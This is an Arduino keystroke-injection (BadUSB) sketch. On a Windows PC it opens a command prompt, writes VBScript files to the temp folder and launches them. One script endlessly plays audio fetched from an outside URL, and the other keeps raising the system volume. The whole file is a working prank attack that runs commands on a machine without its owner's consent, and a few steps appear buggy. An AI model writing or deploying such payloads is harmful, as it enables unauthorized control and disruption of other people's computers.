#include "Keyboard.h"

void typeKey(int key) {
	Keyboard.press(key);
	delay(50);
	Keyboard.release(key);
}

/* Init function */
void setup() {
	delay(3500);
 
	// Begining the Keyboard stream
	Keyboard.begin();

	// Wait 500ms
	delay(500);

	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('r');
	Keyboard.releaseAll();

	typeKey(KEY_RETURN);

	delay(200);

	Keyboard.print("CMD");

	typeKey(KEY_RETURN);

	delay(200);

	Keyboard.print("cd %tmp% && copy con rickyou.vbs");

	typeKey(KEY_RETURN);

	Keyboard.print("While true");

	typeKey(KEY_RETURN);

	Keyboard.print("Dim oPlayer");

	typeKey(KEY_RETURN);
	

	Keyboard.print("Set oPlayer = CreateObject(\"WMPlayer.OCX\")");

	typeKey(KEY_RETURN);

	Keyboard.print("oPlayer.URL = \"https://pixelcoding.nl/download/rickroll.mp3\"");

	typeKey(KEY_RETURN);

	Keyboard.print("oPlayer.controls.play");

	typeKey(KEY_RETURN);

	Keyboard.print("While oPlayer.playState <> 1 ' 1 = Stopped");

	typeKey(KEY_RETURN);

	Keyboard.print("WScript.Sleep 100");

	typeKey(KEY_RETURN);

	Keyboard.print("Wend");

	typeKey(KEY_RETURN);

	Keyboard.print("oPlayer.close");

	typeKey(KEY_RETURN);

	Keyboard.print("Wend");
	
	typeKey(KEY_RETURN);

	delay(100);

	Keyboard.press(KEY_LEFT_CTRL);
	Keyboard.press('z');
	Keyboard.releaseAll();

	typeKey(KEY_RETURN);

	delay(200);
	
	Keyboard.print("copy con volup.vbs");
	
	typeKey(KEY_RETURN);

	Keyboard.print("do");
	
	typeKey(KEY_RETURN);

	Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

	typeKey(KEY_RETURN);

	Keyboard.print("Set WshShell = CreateObject(\"WScript.Shell\")");

	typeKey(KEY_RETURN);

	Keyboard.print("WshShell.SendKeys(chr(&hAF))");

	typeKey(KEY_RETURN);

	Keyboard.print("WScript.Sleep 10");

	typeKey(KEY_RETURN);

	Keyboard.print("loop");

	delay(100);

	Keyboard.press(KEY_LEFT_CTRL);
	Keyboard.press('z');
	Keyboard.releaseAll();

	typeKey(KEY_RETURN);

	delay(200);
	
	Keyboard.print("start rickyou.vbs && volup.vbs");

	// Ending stream
	Keyboard.end();
}

/* Unused endless loop */
void loop() {}